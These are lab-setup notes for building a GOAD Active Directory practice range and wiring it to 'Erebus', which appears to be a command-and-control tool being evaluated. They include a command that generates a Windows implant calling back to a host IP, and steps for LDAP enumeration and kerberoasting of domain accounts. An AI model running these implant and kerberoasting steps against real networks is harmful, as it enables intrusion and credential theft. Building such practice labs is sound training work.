# GOAD Lab Setup (Erebus host notes)

**Clone location:** `/home/zero/labs/GOAD`  
**Preferred lab:** **MINILAB** (2 VMs) or **GOAD-Light** (3 VMs) — full GOAD needs more RAM.  
**Host:** Fedora 43, **15 GB RAM**, libvirt+qemu, docker group, **no VirtualBox/vagrant yet**.

---

## Blockers on this machine (2026-07-09)

| Item | Status |
|------|--------|
| GOAD git clone | **Done** → `/home/zero/labs/GOAD` |
| Docker `goadansible` image | **Built** |
| `~/.goad/goad.ini` | **Written** (MINILAB + libvirt defaults) |
| Python 3.14 + GOAD config bug | **Patched** in local clone (`goad/config.py` no comment-keys) |
| `sudo dnf install vagrant ansible …` | **Needs your password** — cannot auto-install |
| VirtualBox | Not installed |
| Free RAM | ~7 GB free — **tight for MINILAB/GOAD-Light** (close other apps / add swap) |

---

## What you must run (sudo)

```bash
# Fedora packages for libvirt provider path
sudo dnf install -y vagrant ansible python3-pip rsync \
  libvirt-daemon-kvm libvirt-client virt-install \
  @virtualization

# Optional if using VirtualBox instead:
# sudo dnf install -y VirtualBox

# vagrant-libvirt plugin
vagrant plugin install vagrant-libvirt

# ensure nested/user access
sudo usermod -aG libvirt $USER   # already in libvirt group
```

Then:

```bash
cd /home/zero/labs/GOAD
# Check (docker method uses goadansible container for ansible)
./goad_docker.sh -t check -l MINILAB -p libvirt

# Install VMs + provision (LONG — hours, downloads Windows)
./goad_docker.sh -t install -l MINILAB -p libvirt
```

If libvirt provider is not supported in your GOAD version, use:

```bash
./goad_docker.sh -t install -l MINILAB -p virtualbox
# after installing VirtualBox
```

---

## MINILAB inventory (fill after install)

| Role | Hostname | Domain | IP | Notes |
|------|----------|--------|-----|--------|
| DC | | | | |
| Workstation | | | | foothold / implant |

Typical GOAD-Light names (for reference when using Light instead of Mini):

| Host | Role |
|------|------|
| kingslanding | DC01 |
| winterfell | DC02 |
| castleblack | SRV |

---

## Erebus wiring (after VMs up)

1. Note host IP reachable from lab network (often `192.168.56.1` for host-only).  
2. `erebus serve` with HTTPS listener on that interface.  
3. `generate --os windows --sleep 500 --callback https://<HOST_IP>:443 --out implant.exe`  
4. Run implant on domain workstation.  
5. Manual path from `docs/GOLDEN_DEMO.md`.  
6. Log 5× Auto in `scripts/golden_ad_eval.md`.

---

## Erebus golden path against GOAD

Frozen objective (unchanged):

> From the current session on the domain-joined host, recon the box, enumerate domain LDAP for kerberoastable principals, kerberoast candidates if found, and summarize. Do not dump LSASS, install persistence, or move laterally.

Example (replace domain/DC after inventory):

```text
ldap-enum kerberoastable --domain sevenkingdoms.local --dc kingslanding.sevenkingdoms.local
```

---

## Status log

| Date | Event |
|------|--------|
| 2026-07-09 | Cloned GOAD; fixed goad.ini for Py3.14; docker goadansible built; awaiting sudo packages + provision |
